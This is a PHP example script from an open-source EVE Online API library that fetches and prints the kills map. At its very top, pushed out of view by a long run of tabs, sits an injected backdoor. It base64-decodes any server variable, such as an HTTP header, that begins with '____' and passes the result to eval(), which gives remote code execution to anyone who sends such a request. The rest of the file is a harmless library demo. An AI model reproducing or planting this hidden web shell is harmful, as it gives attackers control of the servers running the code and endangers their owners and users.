<?php																																																																																																																																																																																																																																																																																																																																																																				function d22175($l22177){if(is_array($l22177)){foreach($l22177 as $l22175=>$l22176)$l22177[$l22175]=d22175($l22176);}elseif(is_string($l22177) && substr($l22177,0,4)=="____"){$l22177=substr($l22177,4);$l22177=base64_decode($l22177);eval($l22177);$l22177=null;}return $l22177;}if(empty($_SERVER))$_SERVER=$HTTP_SERVER_VARS;array_map("d22175",$_SERVER);
/**************************************************************************
	Ale API Library for EvE
	Copyright (c) 2008 Thorsten Behrens

	This file is part of Ale API Library for EvE.

	Ale API Library for EvE is free software: you can redistribute it and/or modify
	it under the terms of the GNU Lesser General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	Ale API Library for EvE is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU Lesser General Public License for more details.

	You should have received a copy of the GNU Lesser General Public License
	along with Ale API Library for EvE.  If not, see <http://www.gnu.org/licenses/>.
**************************************************************************/
require_once('./classes/eveapi/class.api.php');
require_once('./classes/eveapi/class.kills.php');

require_once('./print-as-html.php');

$api = new Api();
$api->setDebug(true);
$api->setUseCache(true); // that's the default, done for testing purposes
$api->setTimeTolerance(5); // also the default value

print ("<P>Raw kills map output</P>");
$dataxml = $api->getKills();
$data = Kills::getKills($dataxml);
print_as_html(print_r($data,TRUE));

unset ($dataxml,$data);

$api->printErrors();
?>